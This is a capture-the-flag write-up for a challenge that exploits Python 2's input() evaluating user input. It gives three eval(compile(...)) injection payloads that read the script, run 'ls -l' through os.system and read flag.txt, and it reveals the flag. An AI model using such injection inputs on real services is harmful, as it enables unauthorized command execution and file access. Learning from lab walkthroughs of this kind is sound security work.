#### Challenge:

They told us the world was going to end in the year 2000! But it didn't... when <i>will</i> the world end? <br><br> <b>Open the <code>Deployment</code> tab to start this challenge.</b>

---

#### Solution:

The challenge keeps asking for a number, when given a string it throws an error. We expoit the fact that the `input()` function is wrapper for `eval(raw_input())`. More on this here: [https://www.matthewcantelon.ca/blog/sha2017-junior-ctf-small/](https://www.matthewcantelon.ca/blog/sha2017-junior-ctf-small/).

```bash
eval(compile('print open(__file__, "r").readlines()', '<string>', 'exec')) # check current file (nothing there sadly, but we learn this is python2 script)

eval(compile('import os; stream = os.system("ls -l"); print stream', '<string>', 'exec')) # check files in current folder (shows file flag.txt)

eval(compile('print open("flag.txt", "r").readlines()', '<string>', 'exec')) # print the flag

```

---

<details><summary>FLAG:</summary>

```
flag{we_are_saved_from_py2_k}
```

</details>
<br/>
